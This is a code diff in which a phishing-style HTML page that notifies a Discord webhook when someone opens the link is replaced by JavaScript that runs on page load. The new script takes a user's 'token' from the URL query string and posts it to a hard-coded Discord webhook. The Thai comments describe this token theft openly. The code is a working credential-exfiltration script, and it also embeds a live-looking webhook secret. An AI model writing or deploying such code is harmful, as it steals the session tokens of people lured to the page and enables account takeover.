@@ -1,27 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Message to Discord</title>
-    <script>
-        window.onload = function() {
-            const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4hsxyAWA35ZPGiJY';
-            const message = 'มีคนกดลิ้งค์แล้ว';
+// URL ของ Webhook ของ Discord
+const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4';
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: message })
-            })
-            .then(response => console.log('Message sent to Discord:', response))
-            .catch(error => console.error('Error sending message to Discord:', error));
-        };
-    </script>
-</head>
-<body>
-    <h2>Redirecting...</h2>
-</body>
-</html>
+// ฟังก์ชันสำหรับการดึง Token ผู้ใช้งานและส่งไปยัง Webhook
+function getTokenAndSendToWebhook() {
+    // ดึง Token ผู้ใช้งานจาก URL (สมมติว่า Token ถูกเก็บใน query string)
+    const urlParams = new URLSearchParams(window.location.search);
+    const userToken = urlParams.get('token');
+
+    // สร้าง JSON object ที่จะส่งไปยัง Webhook
+    const data = {
+        content: `Token ผู้ใช้งาน: ${userToken}`
+    };
+
+    // สร้าง XMLHttpRequest object
+    const xhr = new XMLHttpRequest();
+
+    // กำหนดวิธีและ URL ที่จะส่งข้อมูลไป
+    xhr.open('POST', webhookUrl);
+
+    // กำหนดหัวข้อ Content-Type เป็น application/json
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    // ส่งข้อมูล JSON ไปยัง Webhook
+    xhr.send(JSON.stringify(data));
+}
+
+// เรียกใช้ฟังก์ชันเมื่อเรียกใช้หน้าเว็บ
+getTokenAndSendToWebhook();
